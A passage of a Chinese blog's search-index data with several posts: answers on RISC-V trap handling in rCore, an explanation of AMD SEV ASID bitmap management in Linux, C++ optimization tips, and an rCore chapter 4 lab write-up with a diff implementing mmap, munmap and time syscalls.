time: usize, &#125;  /// The status of a task\n\ntime 的设置有一点小 bug，就是第一个被调度任务的 time 应该在 run_first_task 中设置，否则它的 time 将会晚一个调度周期，testcase 没测出来。。。写博客时才注意到，懒得改了😓\n\n问答作业t1Q: 正确进入 U 态后，程序的特征还应有：使用 S 态特权指令，访问 S 态寄存器后会报错。 请同学们可以自行测试这些内容（运行 三个 bad 测例 (ch2bbad*.rs) ）， 描述程序出错行为，同时注意注明你使用的 sbi 及其版本。\nA: 略。\nt2深入理解 trap.S 中两个函数 __alltraps 和 __restore 的作用，并回答如下问题：\nQ1: L40：刚进入 __restore 时，a0 代表了什么值。请指出 __restore 的两种使用情景。\nA1: a0 代表了内核栈的栈指针，即 __alltraps 保存的上下文的首地址。\n情景一：表示内核第一次从内核态切换到用户态（或者说将 CPU 所有权转交给用户程序），在初始化或加载应用程序时，内核通过 __restore 恢复必要的状态。\n情景二：当 call trap_handler 执行结束后，程序计数器指向它的下一条指令，即 __restore 的起始地址，表示 Trap 处理完成，将恢复 Trap 时的上下文状态，返回用户态。\nQ2: L43-L48：这几行汇编代码特殊处理了哪些寄存器？这些寄存器的的值对于进入用户态有何意义？请分别解释。\nld t0, 32*8(sp)ld t1, 33*8(sp)ld t2, 2*8(sp)csrw sstatus, t0csrw sepc, t1csrw sscratch, t2\nA2: 特殊处理了 t0、t1、t2、sstatus、sepc、sscratch 寄存器。\nt0、t1、t2 用来暂存从内核栈中读取的之前保存的 CSR 寄存器的值，再使用 csrw 指令将暂存值写入对应的 CSR 寄存器中。\n其中 sstatus 的 SPP 字段给出 Trap 发生之前 CPU 处在哪个特权级等信息，sepc 当 Trap 是异常时（exception）记录之前执行的最后一条指令地址，sscratch 则存储着用户栈的栈指针，用于在 sret 返回用户态前使用 csrrw 指令将当前栈指针从内核栈切换到用户栈。\nQ3: L50-L56：为何跳过了 x2 和 x4？\nld x1, 1*8(sp)ld x3, 3*8(sp).set n, 5.rept 27   LOAD_GP %n   .set n, n+1.endr\nA3: 如下图所示，x2 即 sp 寄存器，保存了内核栈的栈指针。而 x4 寄存器为线程寄存器，在本实验中不会用到。\n\nQ4: L60：该指令之后，sp 和 sscratch 中的值分别有什么意义？\ncsrrw sp, sscratch, sp\nA4: 该指令的作用是先将 sscratch 的值读取到 sp 中，再将 sp 的值写入 sscratch 中，这两个操作是在同一周期内完成的，无需中间寄存器的参与，作用相当于 swap(sp, sscratch). 在返回用户态之前交换 sp 和 sscratch 的值，即将当前栈指针由用户栈切换到内核栈。\nQ5: __restore：中发生状态切换在哪一条指令？为何该指令执行之后会进入用户态？\nA5: 状态切换发生在 sret，该指令会负责从栈中恢复之前保存的程序计数器值，并更新特权级相关的寄存器（如 mstatus）。\nQ6: L13：该指令之后，sp 和 sscratch 中的值分别有什么意义？\ncsrrw sp, sscratch, sp\nA6: 与 L60 相反，作用是将当前栈指针由内核栈切换到用户栈，便于后续的 Trap 处理。\nQ7: 从 U 态进入 S 态是哪一条指令发生的？\nA7: 根据 Trap 的类型不同而定。对于系统调用而言，是 ecall 指令，对于其它的异常情况（如非法操作、页面缺失等）则是在硬件检测到后自动触发异常，从而进入内核态。\n","categories":["操作系统"],"tags":["Rust","操作系统","经验"]},{"title":"AMD SEV机密虚拟机ASID管理","url":"/2025/09/08/AMD%20SEV%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BAASID%E7%AE%A1%E7%90%86/","content":"本文将介绍 Linux 内核中，AMD SEV 机密虚拟机对虚拟机号 ASID 的管理设计，基于的内核版本为 Linux 5.10。\n\n数据结构AMD SEV 中对 ASID 管理的核心代码位于 arch/x86/kvm/svm/sev.c 中，以下是与之相关的数据结构定义：\n/* 定义保护位图的互斥锁 */static DEFINE_MUTEX(sev_bitmap_lock);/* SEV 同时支持的最大 ASID */unsigned int max_sev_asid;/* SEV 应该使用的最小的 ASID */static unsigned int min_sev_asid;/* 待分配的 ASID 位图 */static unsigned long *sev_asid_bitmap;/* 回收的 ASID 位图 */static unsigned long *sev_reclaim_asid_bitmap;\nAMD SEV 的 ASID 管理采用了 双位图 的设计，包含一张分配位图 sev_asid_bitmap 和一张回收位图 sev_reclaim_asid_bitmap。这样的设计有助于将分配和回收的操作尽可能分离来提升性能。\n初始化上述数据结构的初始化发生在 sev_hardware_setup 中，它的基本调用栈为：\nkvm_arch_hardware_setup\t-&gt; .hardware_setup\t\t-&gt; svm_hardware_setup\t\t\t-&gt; sev_hardware_setup\n具体初始化操作如下：\nint __init sev_hardware_setup(void)&#123;\tstruct sev_user_data_status *status;\tint rc;\t/* 通过硬件探测初始化最大 ASID */\tmax_sev_asid = cpuid_ecx(0x8000001F);\tif (!svm_sev_enabled())\t\treturn 1;\t/* 初始化最小 ASID */\tmin_sev_asid = cpuid_edx(0x8000001F);\t/* 初始化 ASID 位图 */\tsev_asid_bitmap = bitmap_zalloc(max_sev_asid, GFP_KERNEL);\tif (!sev_asid_bitmap)\t\treturn 1;\tsev_reclaim_asid_bitmap = bitmap_zalloc(max_sev_asid, GFP_KERNEL);\tif (!sev_reclaim_asid_bitmap)\t\treturn 1;\t/* 后面为与 SEV 平台状态相关的初始化，我们在此不关注 */\t[...]&#125;\n分配与回收分配ASID 的分配主要发生在 SEV 虚拟机初始化函数 sev_guest_init 中，它的基本调用栈为：\nkvm_arch_vm_ioctl(ioctl: KVM_MEMORY_ENCRYPT_OP)\t-&gt; .mem_enc_op\t\t-&gt; svm_mem_enc_op(sev_cmd.id: KVM_SEV_INIT)\t\t\t-&gt; sev_guest_init\n它将调用 sev_asid_new 进行 ASID 号的分配：\nstatic int sev_guest_init(struct kvm *kvm, struct kvm_sev_cmd *argp)&#123;\tstruct kvm_sev_info *sev = &amp;to_kvm_svm(kvm)-&gt;sev_info;\tint asid, ret;\t[...]\tasid = sev_asid_new();\tif (asid &lt; 0)\t\treturn ret;\t[...]&#125;\n分配 ASID 的具体操作如下：\nstatic int sev_asid_new(void)&#123;\tbool retry = true;\tint pos;\tmutex_lock(&amp;sev_bitmap_lock);again:\t/* 在位图 sev_asid_bitmap 中找 (min_sev_asid - 1, sev_asid_bitmap] 之间的空闲位 */\tpos = find_next_zero_bit(sev_asid_bitmap, max_sev_asid, min_sev_asid - 1);\tif (pos &gt;= max_sev_asid) &#123;\t\t/* 无空闲位，尝试回收并重试 */\t\tif (retry &amp;&amp; __sev_recycle_asids()) &#123;\t\t\tretry = false;\t\t\tgoto again;\t\t&#125;\t\t/* 回收后仍然没有空闲位，释放锁后报错 */\t\tmutex_unlock(&amp;sev_bitmap_lock);\t\treturn -EBUSY;\t&#125;\t__set_bit(pos, sev_asid_bitmap);\tmutex_unlock(&amp;sev_bitmap_lock);\t/* +1 是因为 ASID 从 1 开始（0 为 hypervisor 所有） */\treturn pos + 1;&#125;\n回收ASID 的回收主要发生在 SEV 虚拟机释放函数 sev_asid_free 中，它的基本调用栈如下：\nkvm_arch_destroy_vm    -&gt; .vm_destroy        -&gt; svm_vm_destroy            -&gt; sev_vm_destroy                -&gt; sev_asid_free\n它并不是直接将分配位图 sev_asid_bitmap 中对应的位置为空闲，而是设置专门的回收位图 sev_reclaim_asid_bitmap。\nstatic void sev_asid_free(int asid)&#123;\tstruct svm_cpu_data *sd;\tint cpu, pos;\tmutex_lock(&amp;sev_bitmap_lock);\t/* 将当前 ASID 对应的回收位图中对应的位置为 1 */\tpos = asid - 1;\t__set_bit(pos, sev_reclaim_asid_bitmap);\t/* 清除 vmcb 结构 */\tfor_each_possible_cpu(cpu) &#123;\t\tsd = per_cpu(svm_data, cpu);\t\tsd-&gt;sev_vmcbs[pos] = NULL;\t&#125;\tmutex_unlock(&amp;sev_bitmap_lock);&#125;\n现在回到上面分配 ASID 时，在分配位图无空闲位的时候会调用的 __sev_recycle_asids：\nstatic bool __sev_recycle_asids(void)&#123;\tint pos;\tpos = find_next_bit(sev_reclaim_asid_bitmap,\t\t\t    max_sev_asid, min_sev_asid - 1);\t/* 如果回收位图为空，无需操作 */\tif (pos &gt;= max_sev_asid)\t\treturn false;\t/* 刷新 TLB */\tif (sev_flush_asids())\t\treturn false;\t/* \t * 将回收位图合并到分配位图中\t * (分配：1, 回收：1) -&gt; (分配：0)\t * (分配：1, 回收：0) -&gt; (分配：1)\t */\tbitmap_xor(sev_asid_bitmap, sev_asid_bitmap, sev_reclaim_asid_bitmap,\t\t   max_sev_asid);\tbitmap_zero(sev_reclaim_asid_bitmap, max_sev_asid);\treturn true;&#125;\n其中有一个可能令人困惑的点：就是为什么要进行 TLB 的刷新？我的理解是：此时进行 TLB 刷新其实是一种 懒刷新 （或者说批量刷新）的设计。\n一种直观的想法是，在 SEV 虚拟机释放时（sev_asid_free），TLB 中残存的 TLB 条目已经是冗余的，应该进行 TLB 的刷新。但是这会使得每次虚拟机释放都伴随着一次 TLB 的刷新，效率相对较低。事实上，此时即便不进行刷新也并不会影响虚拟地址转换的正确进行，因为在分配位图中，该 ASID 还是处于被占用的状态，它不会被分配给新的虚拟机，因此也就不会发生新创建的虚拟机通过 TLB 残存条目完成错误地址转换的情况。这样安全的状态将持续到回收位图合并到分配位图前，在此之后，新分配的虚拟机将可能被分配得到具有残存 TLB 表项的 ASID 号，因此在此之前需要将 TLB 进行刷新。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"C++代码优化 Chapter1","url":"/2022/03/04/C++%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%20Chapter1/","content":"本文将介绍一些常见的 C++ 代码优化技巧，本文为该系列的第一章，未来不定期更新。\n使用前置递增（递减）运算符可能很多从 C 语言开始学习的朋友会对此感到困惑，觉得这两者在适用的情况下可以任意选择，如 for 循环语句写作 for (int i = 0; i &lt; n; i++) 。这样做当然没错，但会造成一定程度上的资源浪费，因为后置递增运算符需要先将原本的变量值保存下来，再对其进行递增操作，而在此 for 循环中，我们并不需要使用原本的 i 值。并且 ++i 的写法相对来说更符合我们的意愿。\n当然对于基本数据类型来讲，在经过编译器的优化之后，两者的效率可能并没有什么差别，但对于 STL 中的模板容器，或是自定义数据结构的迭代器来讲，前置运算符的效率显然要更高，因为单个对象所占的内存空间更大，使得拷贝暂存的开销也越大。\n 因此，除非必要情况，应该尽可能使用前置递增（递减）运算符。\n使用引用传递引用类型变量并不是一个对象，它只是一个已存在对象的别名，因此在作为变量传递时不会经过拷贝构造的过程，能够显著地提升效率，以下为值传递的情况。\nstruct myStruct&#123;\tint x, y, z;\tmyStruct(int x, int y, int z) : x(x), y(y), z(z) &#123;&#125;\tmyStruct (const myStruct&amp; ms) : x(ms.x), y(ms.y), z(ms.z) &#123;\t\tstd::cout &lt;&lt; &quot;copy constructor is called!&quot; &lt;&lt; std::endl;\t&#125;&#125;;void printMs(myStruct ms) &#123; \tstd::cout &lt;&lt; ms.x &lt;&lt; &quot; &quot; &lt;&lt; ms.y &lt;&lt; &quot; &quot; &lt;&lt; ms.z &lt;&lt; std::endl;&#125;int main()&#123;\tmyStruct ms(1, 2, 3);\tprintMs(ms); // 输出&quot;copy constructor is called!&quot;\tstd::cin.get();&#125;\n事实上，我们只是想通过调用该函数输出结构体对象的成员变量值，因此并不需要对原对象进行拷贝，这将会带来不必要的资源浪费，因此函数的参数应该使用引用传递，此外，由于函数只需要进行输出操作，而不涉及对象修改，因此参数可以加上 const 限定符，将原函数修改为 void printMs(const myStruct&amp; ms) .\n我们知道 C++ 11 引入了一种新的 for 循环语句格式：for (type element : array)，即遍历 array 中的所有元素，因此每次循环都将执行一次 element = array[i]; ++i;，因此如果 element 不是引用类型，则每次循环都将进行一次拷贝，这同样会造成资源浪费。正确的写法应该是 for (type&amp; element : array)，如无需更改对象值，则最好加上 const 限定符。\n此外C++ 11 还加入了自动类型推导 auto 关键字，虽然该关键字不宜滥用，但在基于范围的 for 循环中十分适用，尤其在面对一些较复杂的类型名时，可以使得代码更加简洁：for (auto&amp; element : array).\n使用 emplace() 替代 push()emplace() 函数同样是 C++ 11 引入的新特性，用以替代原来的 push() 。\n以往我们希望向 STL 模板容器中添加元素时，通常会先创建一个元素对象，再调用 push() 将其添加进容器中（此处的 push() 指的是 push_back(), push_front(), insert() 等一系列函数）。这样相当于需要先构造原对象，再拷贝该对象。但如果我们并没有事先创建这个对象，而是希望添加具有特定参数值的对象，那这样做无疑会带来不必要的性能开销，那有没有一种方法能够让我们直接在容器内构造对象呢？emplace() 就具备这样的功能，以下示例对比了 emplace_back() 和 push_back() 的使用方法，并通过重写构造函数和拷贝构造函数来追踪构造和拷贝的调用情况。\nstruct myStruct&#123;\tint x, y, z;\tmyStruct(int x, int y, int z) : x(x), y(y), z(z) &#123;\t\tstd::cout &lt;&lt; &quot;constructor is called!&quot; &lt;&lt; std::endl;\t&#125;\tmyStruct (const myStruct&amp; ms) : x(ms.x), y(ms.y), z(ms.z) &#123;\t\tstd::cout &lt;&lt; &quot;copy constructor is called!&quot; &lt;&lt; std::endl;\t&#125;&#125;;int main()&#123;\tstd::vector&lt;myStruct&gt; msVec;#if 1\tmyStruct ms(1, 2, 3);\tmsVec.push_back(ms);    // 输出    // constructor is called!\t// copy constructor is called!#endif#if 0\tmsVec.emplace_back(1, 2, 3);#endif\tstd::cin.get();&#125;\n可见，push_back() 的原理如上所述，调用了一次构造函数和一次拷贝构造函数。注意，此处的 #if &lt;expression&gt;  &lt;block&gt;  #endif 是预处理操作，当 #if 后的 &lt;expression&gt; 为真，则执行 &lt;block&gt; 代码，否则不执行，因此该操作在这里用作注释。\n当我们执行 emplace_back() 时，结果如下：\nint main()&#123;\tstd::vector&lt;myStruct&gt; msVec;#if 0\tmyStruct ms(1, 2, 3);\tmsVec.push_back(ms);#endif#if 1\tmsVec.emplace_back(1, 2, 3);    // 输出 constructor is called!#endif\tstd::cin.get();&#125;\n当我们希望原地构造时，emplace_back() 参数与元素对象类型的构造函数相同。同样的我们也可以传入一个已经存在的对象，这样效果和 push_back() 相同。\n","categories":["C++"],"tags":["C++"]},{"title":"2024开源操作系统训练营 rCore Chapter4练习","url":"/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/","content":"编程作业思路重写 sys_get_time 和 sys_task_info首先，第一个任务：由于引入了虚拟内存后，sys_get_time 和 sys_task_info 失效了，需要进行重写。\n这里解释一下为什么会失效：以 sys_get_time 为例，用户在发起系统调用时，传入的参数 _ts 是用户态下的虚拟地址，它需要借助内核的软件地址转换机制，查找任务对应的页表，将 _ts 转换为物理地址，再对该地址处的值进行填充。这里可以使用 page_table.rs 中预先实现好的 translated_byte_buffer，它将一整个虚拟地址段翻译为一系列的物理地址段（每页一段），这样如果结构体 TimeVal 和 TaskInfo 横跨多个页面也同样适用。\n\n注意，内核态代码中的地址仍然是虚拟地址，只不过在 rCore 中，内核态的低 256GB 为直接映射，因此好像内核代码在直接访问物理地址，其实还是虚拟地址。\n\n实现 mmapPOSIX 标准中的 mmap 是将一个文件或其他对象的数据映射到进程的地址空间中，而本实验需实现的 mmap 则为简化版本，只是简单地向进程地址空间中插入一段虚拟内存段，而无需为其设置初始值。\n在尝试进行 mmap 之前，需要检查可能发生的错误。按照手册的提示，可能的错误如下：\n\nstart 没有按页大小对齐\nport &amp; !0x7 != 0 (port 其余位必须为0)\nport &amp; 0x7 = 0 (这样的内存无意义)\n[start, start + len) 中存在已经被映射的页\n物理内存不足\n\n前三个错误很容易判断，如下所示，在此不必赘述。\n// 1. illegal start virtual address or portif !start_va.aligned() || port &amp; !0x7 != 0 || port &amp; 0x7 == 0 &#123;    return -1;&#125;\n物理内存是否充足，需要判断尝试映射的内存长度与空闲物理内存的大小关系。rCore 所采用的物理内存策略是简单的栈式分配器，剩余物理内存大小等于 end - current 加上 recycled.len().\n/// Check if the remaining physical memory is sufficientpub fn is_mem_sufficient(_len: usize) -&gt; bool &#123;    let fa = FRAME_ALLOCATOR.exclusive_access();    let page_cnt = fa.end - fa.current + fa.recycled.len();    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt&#125;\n要判断一段虚拟内存段是否存在已被映射的页面，需要遍历每个页面的起始地址，使用软件地址转换机制尝试对该虚拟地址进行“翻译”，如果成功得到对应的页表项，则说明虚拟页面已被映射，mmap 出错。\n// 3. Check if trying to map mapped pagefor vpn in vpn_range &#123;    if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;        if pte.is_valid() &#123;            return -1;        &#125;    &#125;&#125;\n检查完所有可能的错误之后，便可以开始进行实际的页面映射了。实际上，在 rCore 中，一个地址空间由若干个逻辑段（MapArea）组成，想要将一段虚拟内存段插入地址空间中，只需要根据 sys_mmap 的参数 start, len, port 构建一个 MapArea 数据结构，再将其插入 memory_set.areas 中（页表项的插入会同时实现）。实际上，rCore 中提供了这样的接口：insert_framed_area。\n实现 munmap与 mmap 一样，首先检查可能的错误：[start, start + len) 中存在未被映射的虚存，实现方式与 mmap 一样，在此不再介绍。\n实际上，严格的 munmap 实现并不简单，需要考虑将原有的 memeort_set.areas 中的 MapArea 进行进行分割处理。在这里，为了实现的简单，假设 [start, start + len) 正好为一个完整的逻辑段，而非一个更大逻辑段的一部分（测试样例中没有这种情况）。有了这个简化，munmap 就很简单了：只需遍历 memory_set.areas 的各个逻辑段 area，当找到指定逻辑段时，使用 area.unmap() 移除对应的页表项映射，最后将 area 从 memory_set.areas 中移除。\n/// Remove framed areapub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;    let mut idx = 0;    for area in self.areas.iter_mut() &#123;        if area.vpn_range.get_start().0 == range.get_start().0         &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;            area.unmap(&amp;mut self.page_table);            break;        &#125;        idx += 1;    &#125;    self.areas.remove(idx);&#125;\n代码diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 01e62fd..e916f1e 100644--- a/os/src/mm/frame_allocator.rs+++ b/os/src/mm/frame_allocator.rs@@ -2,7 +2,7 @@ //! controls all the frames in the operating system.  use super::&#123;PhysAddr, PhysPageNum&#125;;-use crate::config::MEMORY_END;+use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;; use crate::sync::UPSafeCell; use alloc::vec::Vec; use core::fmt::&#123;self, Debug, Formatter&#125;;@@ -117,6 +117,13 @@ pub fn frame_dealloc(ppn: PhysPageNum) &#123;     FRAME_ALLOCATOR.exclusive_access().dealloc(ppn); &#125; +/// Check if the remaining physical memory is sufficient+pub fn is_mem_sufficient(_len: usize) -&gt; bool &#123;+    let fa = FRAME_ALLOCATOR.exclusive_access();+    let page_cnt = fa.end - fa.current + fa.recycled.len();+    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt+&#125;+ #[allow(unused)] /// a simple test for frame allocator pub fn frame_allocator_test() &#123;diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex 7a7b7ea..fca0b7f 100644--- a/os/src/mm/memory_set.rs+++ b/os/src/mm/memory_set.rs@@ -63,6 +63,19 @@ impl MemorySet &#123;             None,         );     &#125;+    /// Remove framed area+    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;+        let mut idx = 0;+        for area in self.areas.iter_mut() &#123;+            if area.vpn_range.get_start().0 == range.get_start().0 +                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;+                area.unmap(&amp;mut self.page_table);+                break;+            &#125;+            idx += 1;+        &#125;+        self.areas.remove(idx);+    &#125;     fn push(&amp;mut self, mut map_area: MapArea, data: Option&lt;&amp;[u8]&gt;) &#123;         map_area.map(&amp;mut self.page_table);         if let Some(data) = data &#123;diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex 06f045c..8f21283 100644--- a/os/src/mm/mod.rs+++ b/os/src/mm/mod.rs@@ -12,9 +12,9 @@ mod heap_allocator; mod memory_set; mod page_table; -pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;-use address::&#123;StepByOne, VPNRange&#125;;-pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;+pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;+use address::StepByOne;+pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;; pub use memory_set::remap_test; pub use memory_set::&#123;kernel_stack_position, MapPermission, MemorySet, KERNEL_SPACE&#125;; pub use page_table::&#123;translated_byte_buffer, PageTableEntry&#125;;diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 4a5297d..129ed7f 100644--- a/os/src/syscall/mod.rs+++ b/os/src/syscall/mod.rs@@ -30,8 +30,11 @@ mod process;  use fs::*; use process::*;++use crate::task::inc_syscall_times; /// handle syscall exception with `syscall_id` and other arguments pub fn syscall(syscall_id: usize, args: [usize; 3]) -&gt; isize &#123;+    inc_syscall_times(syscall_id);     match syscall_id &#123;         SYSCALL_WRITE =&gt; sys_write(args[0], args[1] as *const u8, args[2]),         SYSCALL_EXIT =&gt; sys_exit(args[0] as i32),diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex e2f6662..e23a90c 100644--- a/os/src/syscall/process.rs+++ b/os/src/syscall/process.rs@@ -1,9 +1,11 @@ //! Process management syscalls++use core::mem::size_of;+ use crate::&#123;-    config::MAX_SYSCALL_NUM,-    task::&#123;-        change_program_brk, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus,-    &#125;,+    config::MAX_SYSCALL_NUM, mm::translated_byte_buffer, task::&#123;+        change_program_brk, current_user_token, exit_current_and_run_next, get_scheduled_timespan, get_syscall_times, suspend_current_and_run_next, task_mmap, task_munmap, TaskStatus+    &#125;, timer::get_time_us &#125;;  #[repr(C)]@@ -43,7 +45,21 @@ pub fn sys_yield() -&gt; isize &#123; /// HINT: What if [`TimeVal`] is splitted by two pages ? pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123;     trace!(&quot;kernel: sys_get_time&quot;);-    -1+    let _us = get_time_us();+    let time_val = TimeVal &#123;+        sec: _us / 1_000_000,+        usec: _us % 1_000_000,+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal&gt;());+    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            time_val_ptr = time_val_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// YOUR JOB: Finish sys_task_info to pass testcases@@ -51,19 +67,33 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123; /// HINT: What if [`TaskInfo`] is splitted by two pages ? pub fn sys_task_info(_ti: *mut TaskInfo) -&gt; isize &#123;     trace!(&quot;kernel: sys_task_info NOT IMPLEMENTED YET!&quot;);-    -1+    let task_info = TaskInfo &#123;+        status: TaskStatus::Running,+        syscall_times: get_syscall_times(),+        time: get_scheduled_timespan(),+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo&gt;());+    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            task_info_ptr = task_info_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  // YOUR JOB: Implement mmap. pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -&gt; isize &#123;-    trace!(&quot;kernel: sys_mmap NOT IMPLEMENTED YET!&quot;);-    -1+    // trace!(&quot;kernel: sys_mmap NOT IMPLEMENTED YET!&quot;);+    task_mmap(_start, _len, _port) &#125;  // YOUR JOB: Implement munmap. pub fn sys_munmap(_start: usize, _len: usize) -&gt; isize &#123;-    trace!(&quot;kernel: sys_munmap NOT IMPLEMENTED YET!&quot;);-    -1+    // trace!(&quot;kernel: sys_munmap NOT IMPLEMENTED YET!&quot;);+    task_munmap(_start, _len) &#125; /// change data segment size pub fn sys_sbrk(size: i32) -&gt; isize &#123;diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex a745df8..460b23b 100644--- a/os/src/task/mod.rs+++ b/os/src/task/mod.rs@@ -14,8 +14,11 @@ mod switch; #[allow(clippy::module_inception)] mod task; +use crate::config::MAX_SYSCALL_NUM; use crate::loader::&#123;get_app_data, get_num_app&#125;;+use crate::mm::&#123;is_mem_sufficient, MapPermission, VPNRange, VirtAddr, VirtPageNum&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use crate::trap::TrapContext; use alloc::vec::Vec; use lazy_static::*;@@ -140,6 +143,11 @@ impl TaskManager &#123;             let mut inner = self.inner.exclusive_access();             let current = inner.current_task;             inner.tasks[next].task_status = TaskStatus::Running;+            // if the task is being called for the first time,+            if inner.tasks[next].time == 0usize &#123;+                // then set it to the current time+                inner.tasks[next].time = get_time_ms();+            &#125;             inner.current_task = next;             let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;             let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;@@ -153,6 +161,80 @@ impl TaskManager &#123;             panic!(&quot;All applications completed!&quot;);         &#125;     &#125;++    /// Get task&#x27;s syscall times+    pub fn get_syscall_times(&amp;self) -&gt; [u32; MAX_SYSCALL_NUM] &#123;+        let inner = self.inner.exclusive_access();+        let current = inner.current_task;+        inner.tasks[current].syscall_times.clone()+    &#125;++    /// Get task&#x27;s time span between current time and first scheduled time+    pub fn get_scheduled_timespan(&amp;self) -&gt; usize &#123;+        let inner = self.inner.exclusive_access();+        let current = inner.current_task;+        get_time_ms() - inner.tasks[current].time+    &#125;++    /// Increase syscall times+    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -&gt; bool &#123;+        if syscall_id &gt;= MAX_SYSCALL_NUM &#123;+            return false;+        &#125;+        let mut inner = self.inner.exclusive_access();+        let current = inner.current_task;+        inner.tasks[current].syscall_times[syscall_id] += 1;+        true+    &#125;++    /// Map some pages to memory_set+    fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let cur = inner.current_task;+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil()+        );+        +        // 3. Check if trying to map mapped page+        for vpn in vpn_range &#123;\t+            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;+                if pte.is_valid() &#123;+                    return -1;+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // push a new map_area to current memory_set+        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;+        inner.tasks[cur].memory_set.insert_framed_area(start_va, end_va, perm);+        0+    &#125;++    /// Unmap some pages in memory set+    fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let cur = inner.current_task;+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil(),+        );++        // 1. Check if trying to unmap unmapped page+        for vpn in vpn_range &#123;+            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;+                if !pte.is_valid() &#123;+                    return -1+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // remove some pages from current memory_set+        inner.tasks[cur].memory_set.remove_framed_area(vpn_range);+        0+    &#125; &#125;  /// Run the first task in task list.@@ -202,3 +284,46 @@ pub fn current_trap_cx() -&gt; &amp;&#x27;static mut TrapContext &#123; pub fn change_program_brk(size: i32) -&gt; Option&lt;usize&gt; &#123;     TASK_MANAGER.change_current_program_brk(size) &#125;++/// Get current task&#x27;s syscall times+pub fn get_syscall_times() -&gt; [u32; MAX_SYSCALL_NUM] &#123;+    TASK_MANAGER.get_syscall_times()+&#125;++/// Get current task&#x27;s time span between current time and first scheduled time+pub fn get_scheduled_timespan() -&gt; usize &#123;+    TASK_MANAGER.get_scheduled_timespan()+&#125;++/// Increase current task&#x27;s syscall times+pub fn inc_syscall_times(syscall_id: usize) -&gt; bool &#123;+    TASK_MANAGER.inc_syscall_times(syscall_id)+&#125;++/// Map some pages to current task&#x27;s memory_set+pub fn task_mmap(start: usize, len: usize, port: usize) -&gt; isize &#123;+    let start_va = VirtAddr::from(start);+    // 1. illegal start virtual address or port+    if !start_va.aligned() || port &amp; !0x7 != 0 || port &amp; 0x7 == 0 &#123;+        return -1;+    &#125;++    // 2. Check is there sufficient physical memory+    if !is_mem_sufficient(len) &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(start + len);+    TASK_MANAGER.mmap(start_va, end_va, port)+&#125;++/// Unmap some pages in current task&#x27;s memory set+pub fn task_munmap(start: usize, len: usize) -&gt; isize &#123;+    let start_va = VirtAddr::from(start);+    if !start_va.aligned() &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(start + len);+    TASK_MANAGER.munmap(start_va, end_va)+&#125;\\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex dce6981..396342d 100644--- a/os/src/task/task.rs+++ b/os/src/task/task.rs@@ -1,6 +1,6 @@ //! Types related to task management use super::TaskContext;-use crate::config::TRAP_CONTEXT_BASE;+use crate::config::&#123;MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;; use crate::mm::&#123;     kernel_stack_position, MapPermission, MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE, &#125;;@@ -28,6 +28,12 @@ pub struct TaskControlBlock &#123;      /// Program break     pub program_brk: usize,++    /// The syscall times+    pub syscall_times: [u32; MAX_SYSCALL_NUM],++    /// The first time the task was scheduled+    